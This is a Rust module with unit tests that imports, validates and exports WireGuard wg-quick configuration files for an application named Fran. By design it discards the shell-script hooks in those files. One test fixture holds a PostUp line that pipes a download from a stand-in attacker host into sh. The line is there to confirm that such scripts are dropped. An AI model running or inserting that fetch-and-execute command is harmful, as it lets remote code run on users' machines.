//! WireGuard profiles: reading a wg-quick .conf, checking what the editor sends, and what the worker gets.

use std::net::IpAddr;

use base64ct::{Base64, Encoding};
use x25519_dalek::{PublicKey, StaticSecret};
use zeroize::Zeroizing;

use super::frames::WireGuardStart;
use crate::error::{AppError, AppResult};
use crate::vpn_store::{ImportInfo, ImportNote, VpnKind, VpnProfile, VpnProto, VpnRemote, WireGuardSettings};

pub const DEFAULT_PORT: u16 = 51820;
const MAX_FILE: usize = 64 * 1024;
const MTU_RANGE: std::ops::RangeInclusive<u16> = 576..=9000;

/// wg-quick runs these as shell commands.
const SCRIPTS: &[&str] = &["preup", "postup", "predown", "postdown"];

/// Only matter to wg-quick or to a server.
const IGNORED: &[(&str, &str)] = &[
    ("listenport", "sets a fixed local port. Fran uses any free one."),
    ("table", "picks a routing table for wg-quick"),
    ("fwmark", "marks packets for wg-quick's own routing"),
    ("saveconfig", "makes wg-quick write the file back"),
];

pub struct Parsed {
    pub profile: VpnProfile,
    pub private_key: Zeroizing<String>,
    pub preshared_key: Option<Zeroizing<String>>,
}

/// A wg-quick file has an [Interface] section. An .ovpn never does.
pub fn looks_like(text: &str) -> bool {
    text.lines().any(|line| line.trim().eq_ignore_ascii_case("[interface]"))
}

fn decode_key(text: &str, what: &str) -> AppResult<Zeroizing<[u8; 32]>> {
    let bad = || AppError::general(format!("The {what} isn't a WireGuard key"));
    let bytes = Zeroizing::new(Base64::decode_vec(text.trim()).map_err(|_| bad())?);
    <[u8; 32]>::try_from(bytes.as_slice()).map(Zeroizing::new).map_err(|_| bad())
}

/// The key in its usual form, so a key pasted with stray spaces is saved the same as one from a file.
pub fn clean_key(text: &str, what: &str) -> AppResult<String> {
    decode_key(text, what).map(|bytes| Base64::encode_string(bytes.as_slice()))
}

pub fn public_key(private_key: &str) -> AppResult<String> {
    let secret = StaticSecret::from(*decode_key(private_key, "private key")?);
    Ok(Base64::encode_string(PublicKey::from(&secret).as_bytes()))
}

/// A new private key and its public key.
pub fn generate() -> (Zeroizing<String>, String) {
    let secret = StaticSecret::random();
    (Zeroizing::new(Base64::encode_string(secret.as_bytes())), Base64::encode_string(PublicKey::from(&secret).as_bytes()))
}

fn network(text: &str) -> AppResult<(IpAddr, u8)> {
    let text = text.trim();
    let (addr, prefix) = match text.split_once('/') {
        Some((addr, prefix)) => (addr, Some(prefix)),
        None => (text, None),
    };
    let addr: IpAddr = addr.trim().parse().map_err(|_| AppError::general(format!("{text} isn't an IP address")))?;
    let max = if addr.is_ipv4() { 32 } else { 128 };
    let prefix = match prefix {
        Some(prefix) => prefix.trim().parse::<u8>().ok().filter(|prefix| *prefix <= max).ok_or_else(|| AppError::general(format!("{text} has a wrong prefix length")))?,
        None => max,
    };
    Ok((addr, prefix))
}

fn networks(items: &[String], what: &str) -> AppResult<Vec<String>> {
    let cleaned: Vec<String> = items
        .iter()
        .map(|item| item.trim())
        .filter(|item| !item.is_empty())
        .map(|item| network(item).map(|(addr, prefix)| format!("{addr}/{prefix}")))
        .collect::<AppResult<_>>()?;
    if cleaned.is_empty() {
        return Err(AppError::general(format!("Add {what}")));
    }
    Ok(cleaned)
}

fn list(value: &str) -> impl Iterator<Item = &str> {
    value.split(',').map(str::trim).filter(|item| !item.is_empty())
}

fn plain_name(value: &str, what: &str) -> AppResult<String> {
    let value = value.trim();
    if value.is_empty() || value.chars().any(|character| character.is_whitespace() || character.is_control() || matches!(character, ',' | '#' | '[' | ']' | '=')) {
        return Err(AppError::general(format!("The {what} \"{value}\" can't be used")));
    }
    Ok(value.to_string())
}

/// `host:port`, with an IPv6 address in brackets. The port defaults to WireGuard's.
fn endpoint(text: &str) -> AppResult<VpnRemote> {
    let text = text.trim();
    let bad_port = || AppError::general(format!("The endpoint {text} has a wrong port"));
    let (host, port) = match text.strip_prefix('[') {
        Some(rest) => {
            let (host, after) = rest.split_once(']').ok_or_else(|| AppError::general(format!("The endpoint {text} isn't closed with ]")))?;
            (host, after.strip_prefix(':'))
        }
        None => match text.rsplit_once(':') {
            Some((host, port)) if !host.contains(':') => (host, Some(port)),
            _ => (text, None),
        },
    };
    let port = match port {
        Some(port) => port.trim().parse::<u16>().ok().filter(|port| *port > 0).ok_or_else(bad_port)?,
        None => DEFAULT_PORT,
    };
    Ok(VpnRemote { host: plain_name(host, "endpoint")?, port, proto: VpnProto::Udp })
}

/// Checks and tidies the fields the editor sends. The public key comes from the vault key, not from here.
pub fn clean(mut settings: WireGuardSettings) -> AppResult<WireGuardSettings> {
    settings.peer_public_key = clean_key(&settings.peer_public_key, "server's public key")?;
    settings.addresses = networks(&settings.addresses, "this side's address in the VPN")?;
    settings.allowed_ips = networks(&settings.allowed_ips, "the allowed IPs, like 0.0.0.0/0 for everything")?;
    settings.dns = settings
        .dns
        .iter()
        .map(|item| item.trim())
        .filter(|item| !item.is_empty())
        .map(|item| item.parse::<IpAddr>().map(|ip| ip.to_string()).map_err(|_| AppError::general(format!("The DNS server {item} isn't an IP address"))))
        .collect::<AppResult<_>>()?;
    settings.search_domains = settings
        .search_domains
        .iter()
        .filter(|item| !item.trim().is_empty())
        .map(|item| plain_name(item, "search domain"))
        .collect::<AppResult<_>>()?;
    if let Some(mtu) = settings.mtu.filter(|mtu| !MTU_RANGE.contains(mtu)) {
        return Err(AppError::general(format!("An MTU of {mtu} won't work. Use {} to {}.", MTU_RANGE.start(), MTU_RANGE.end())));
    }
    settings.keepalive_secs = settings.keepalive_secs.filter(|secs| *secs > 0);
    Ok(settings)
}

pub fn clean_endpoint(remote: &VpnRemote) -> AppResult<VpnRemote> {
    if remote.port == 0 {
        return Err(AppError::general(format!("Choose a port for {}", remote.host.trim())));
    }
    Ok(VpnRemote { host: plain_name(remote.host.trim_start_matches('[').trim_end_matches(']'), "endpoint")?, port: remote.port, proto: VpnProto::Udp })
}

/// Reads a wg-quick .conf. Scripts are never kept, and a file with more than one peer is refused.
pub fn parse(text: &str, file_name: &str) -> AppResult<Parsed> {
    #[derive(Clone, Copy, PartialEq)]
    enum Section {
        None,
        Interface,
        Peer,
        Other,
    }

    if text.len() > MAX_FILE {
        return Err(AppError::general("That file is too large to be a WireGuard config"));
    }
    let mut info = ImportInfo { file_name: file_name.to_string(), ..Default::default() };
    let mut settings = WireGuardSettings::default();
    let mut private_key: Option<Zeroizing<String>> = None;
    let mut preshared_key: Option<Zeroizing<String>> = None;
    let mut remote: Option<VpnRemote> = None;
    let mut section = Section::None;
    let mut peers = 0;

    for raw in text.lines() {
        let line = raw.split('#').next().unwrap_or_default().trim();
        if line.is_empty() {
            continue;
        }
        if line.starts_with('[') {
            section = match line.to_ascii_lowercase().as_str() {
                "[interface]" => Section::Interface,
                "[peer]" => {
                    peers += 1;
                    Section::Peer
                }
                _ => Section::Other,
            };
            continue;
        }
        let Some((key, value)) = line.split_once('=') else { continue };
        let (key, value) = (key.trim(), value.trim());
        let name = key.to_ascii_lowercase();
        let used = match (section, name.as_str()) {
            (Section::Interface, "privatekey") => {
                private_key = Some(Zeroizing::new(clean_key(value, "private key")?));
                true
            }
            (Section::Interface, "address") => {
                for item in list(value) {
                    let (addr, prefix) = network(item)?;
                    settings.addresses.push(format!("{addr}/{prefix}"));
                }
                true
            }
            (Section::Interface, "dns") => {
                for item in list(value) {
                    match item.parse::<IpAddr>() {
                        Ok(ip) => settings.dns.push(ip.to_string()),
                        Err(_) => settings.search_domains.push(plain_name(item, "search domain")?),
                    }
                }
                true
            }
            (Section::Interface, "mtu") => {
                settings.mtu = Some(value.parse().map_err(|_| AppError::general(format!("MTU {value} isn't a number")))?);
                true
            }
            (Section::Peer, "publickey") => {
                settings.peer_public_key = clean_key(value, "server's public key")?;
                true
            }
            (Section::Peer, "presharedkey") => {
                preshared_key = Some(Zeroizing::new(clean_key(value, "preshared key")?));
                true
            }
            (Section::Peer, "endpoint") => {
                remote = Some(endpoint(value)?);
                true
            }
            (Section::Peer, "allowedips") => {
                for item in list(value) {
                    let (addr, prefix) = network(item)?;
                    settings.allowed_ips.push(format!("{addr}/{prefix}"));
                }
                true
            }
            (Section::Peer, "persistentkeepalive") => {
                settings.keepalive_secs = match value.to_ascii_lowercase().as_str() {
                    "off" | "0" => None,
                    secs => Some(secs.parse().map_err(|_| AppError::general(format!("PersistentKeepalive {value} isn't a number")))?),
                };
                true
            }
            (_, name) if SCRIPTS.contains(&name) => {
                info.dropped.push(ImportNote { option: key.to_string(), reason: "runs a shell command. Fran never runs those.".to_string() });
                false
            }
            (_, name) => {
                let reason = IGNORED.iter().find(|(known, _)| *known == name).map_or("isn't used by Fran", |(_, reason)| reason);
                info.ignored.push(ImportNote { option: key.to_string(), reason: reason.to_string() });
                false
            }
        };
        if used && !info.used.iter().any(|seen| seen.eq_ignore_ascii_case(key)) {
            info.used.push(key.to_string());
        }
    }

    match peers {
        0 => return Err(AppError::general("The file has no [Peer] section")),
        1 => {}
        count => return Err(AppError::general(format!("The file has {count} peers. A VPN in Fran is one peer, so split it into one file per peer."))),
    }
    let private_key = private_key.ok_or_else(|| AppError::general("The file has no PrivateKey"))?;
    if settings.peer_public_key.is_empty() {
        return Err(AppError::general("The [Peer] has no PublicKey"));
    }
    let remote = remote.ok_or_else(|| AppError::general("The [Peer] has no Endpoint. Fran connects out to the server, so it needs one."))?;
    if settings.addresses.is_empty() {
        return Err(AppError::general("The [Interface] has no Address"));
    }
    if settings.allowed_ips.is_empty() {
        return Err(AppError::general("The [Peer] has no AllowedIPs"));
    }
    settings.public_key = Some(public_key(&private_key)?);
    info.imported_at = crate::ssh_store::now_millis();

    let label = std::path::Path::new(file_name).file_stem().map(|stem| stem.to_string_lossy().to_string()).filter(|stem| !stem.trim().is_empty());
    let profile = VpnProfile {
        label: label.unwrap_or_else(|| "WireGuard".to_string()),
        kind: VpnKind::WireGuard,
        remotes: vec![remote],
        require_server_cert: false,
        wire_guard: settings,
        imported: Some(info),
        ..Default::default()
    };
    Ok(Parsed { profile, private_key, preshared_key })
}

/// What the worker gets, from the saved fields and the keys from the vault.
pub fn start(profile: &VpnProfile, private_key: &str, preshared_key: Option<&str>) -> AppResult<WireGuardStart> {
    let settings = &profile.wire_guard;
    let remote = profile.remotes.first().ok_or_else(|| AppError::general(format!("VPN {} has no endpoint", profile.label)))?;
    let parse_all = |items: &[String]| items.iter().map(|item| network(item)).collect::<AppResult<Vec<_>>>();
    Ok(WireGuardStart {
        private_key: private_key.to_string(),
        peer_public_key: settings.peer_public_key.clone(),
        preshared_key: preshared_key.map(str::to_string),
        endpoint_host: remote.host.clone(),
        endpoint_port: remote.port,
        allowed_ips: parse_all(&settings.allowed_ips)?,
        keepalive_secs: settings.keepalive_secs,
        addresses: parse_all(&settings.addresses)?,
        dns: settings
            .dns
            .iter()
            .map(|item| item.parse().map_err(|_| AppError::general(format!("The DNS server {item} isn't an IP address"))))
            .collect::<AppResult<_>>()?,
        search_domains: settings.search_domains.clone(),
        mtu: settings.mtu,
    })
}

/// A standard wg-quick file with the keys in it, for export. Fields are checked again, since vpn.json can be edited by hand.
pub fn portable(profile: &VpnProfile, private_key: &str, preshared_key: Option<&str>) -> AppResult<String> {
    let settings = clean(profile.wire_guard.clone())?;
    let remote = clean_endpoint(profile.remotes.first().ok_or_else(|| AppError::general(format!("VPN {} has no endpoint", profile.label)))?)?;
    let host = if remote.host.contains(':') { format!("[{}]", remote.host) } else { remote.host };

    let mut out = String::from("[Interface]\n");
    out.push_str(&format!("PrivateKey = {}\n", clean_key(private_key, "private key")?));
    out.push_str(&format!("Address = {}\n", settings.addresses.join(", ")));
    let dns: Vec<&str> = settings.dns.iter().chain(&settings.search_domains).map(String::as_str).collect();
    if !dns.is_empty() {
        out.push_str(&format!("DNS = {}\n", dns.join(", ")));
    }
    if let Some(mtu) = settings.mtu {
        out.push_str(&format!("MTU = {mtu}\n"));
    }
    out.push_str("\n[Peer]\n");
    out.push_str(&format!("PublicKey = {}\n", settings.peer_public_key));
    if let Some(key) = preshared_key {
        out.push_str(&format!("PresharedKey = {}\n", clean_key(key, "preshared key")?));
    }
    out.push_str(&format!("Endpoint = {host}:{}\n", remote.port));
    out.push_str(&format!("AllowedIPs = {}\n", settings.allowed_ips.join(", ")));
    if let Some(secs) = settings.keepalive_secs {
        out.push_str(&format!("PersistentKeepalive = {secs}\n"));
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The shape commercial providers hand out: IPv4 and IPv6 addresses, DNS, a full tunnel.
    const PROVIDER: &str = "[Interface]
# Device: Quick Fox
PrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=
Address = 10.68.12.34/32,fc00:bbbb:bbbb:bb01::5:c21/128
DNS = 10.64.0.1

[Peer]
PublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=
AllowedIPs = 0.0.0.0/0,::0/0
Endpoint = 185.213.154.68:51820
";

    /// What an admin writes for wg-quick: scripts, a preshared key, search domains mixed into DNS.
    const OFFICE: &str = "[Interface]
PrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=
Address = 10.10.0.5/24
DNS = 10.10.0.1, corp.example, lab.corp.example
ListenPort = 51820
PostUp = iptables -A FORWARD -i %i -j ACCEPT; curl http://evil.example | sh
PostDown = iptables -D FORWARD -i %i -j ACCEPT

[Peer]
PublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=
PresharedKey = FpCyhws9cxwWoV4xELtfJvjJN+zQVRPISllRWgeopVE=
AllowedIPs = 10.10.0.0/24, 192.168.50.0/24
Endpoint = vpn.corp.example:51821
PersistentKeepalive = 25
";

    #[test]
    fn a_provider_file_imports_as_a_full_tunnel() {
        let parsed = parse(PROVIDER, "se-got-wg-001.conf").unwrap();
        let profile = &parsed.profile;
        assert_eq!(profile.label, "se-got-wg-001");
        assert_eq!(profile.remotes, vec![VpnRemote { host: "185.213.154.68".to_string(), port: 51820, proto: VpnProto::Udp }]);
        assert_eq!(profile.wire_guard.addresses, vec!["10.68.12.34/32", "fc00:bbbb:bbbb:bb01::5:c21/128"]);
        assert_eq!(profile.wire_guard.allowed_ips, vec!["0.0.0.0/0", "::/0"]);
        assert_eq!(profile.wire_guard.dns, vec!["10.64.0.1"]);
        assert!(parsed.preshared_key.is_none());
    }

    #[test]
    fn scripts_are_never_kept_and_dns_names_become_search_domains() {
        let parsed = parse(OFFICE, "office.conf").unwrap();
        let profile = &parsed.profile;
        let info = profile.imported.as_ref().unwrap();
        assert_eq!(info.dropped.iter().map(|note| note.option.as_str()).collect::<Vec<_>>(), vec!["PostUp", "PostDown"]);
        assert!(!format!("{profile:?}").contains("evil.example"), "a script survived the import");
        assert_eq!(profile.wire_guard.dns, vec!["10.10.0.1"]);
        assert_eq!(profile.wire_guard.search_domains, vec!["corp.example", "lab.corp.example"]);
        assert_eq!(profile.remotes[0].host, "vpn.corp.example");
        assert_eq!(profile.remotes[0].port, 51821);
        assert_eq!(profile.wire_guard.keepalive_secs, Some(25));
        assert!(parsed.preshared_key.is_some());
    }

    #[test]
    fn files_fran_cant_run_are_refused_with_the_reason() {
        let two_peers = format!("{PROVIDER}\n[Peer]\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\nAllowedIPs = 10.0.0.0/8\n");
        assert!(parse(&two_peers, "x.conf").err().unwrap().message.contains("2 peers"));
        let no_endpoint = PROVIDER.replace("Endpoint = 185.213.154.68:51820\n", "");
        assert!(parse(&no_endpoint, "x.conf").err().unwrap().message.contains("Endpoint"));
        let bad_key = PROVIDER.replace("PublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=", "PublicKey = not-a-key");
        assert!(parse(&bad_key, "x.conf").is_err());
    }

    #[test]
    fn ipv6_endpoints_keep_their_port() {
        assert_eq!(endpoint("[2001:db8::1]:443").unwrap(), VpnRemote { host: "2001:db8::1".to_string(), port: 443, proto: VpnProto::Udp });
        assert_eq!(endpoint("2001:db8::1").unwrap().port, DEFAULT_PORT);
    }

    #[test]
    fn an_exported_file_imports_back_the_same() {
        let parsed = parse(OFFICE, "office.conf").unwrap();
        let text = portable(&parsed.profile, &parsed.private_key, parsed.preshared_key.as_deref().map(|key| key.as_str())).unwrap();
        let again = parse(&text, "office.conf").unwrap();
        assert_eq!(again.profile.wire_guard.addresses, parsed.profile.wire_guard.addresses);
        assert_eq!(again.profile.wire_guard.allowed_ips, parsed.profile.wire_guard.allowed_ips);
        assert_eq!(again.profile.wire_guard.search_domains, parsed.profile.wire_guard.search_domains);
        assert_eq!(again.profile.remotes, parsed.profile.remotes);
        assert_eq!(again.preshared_key.as_deref(), parsed.preshared_key.as_deref());
    }
}
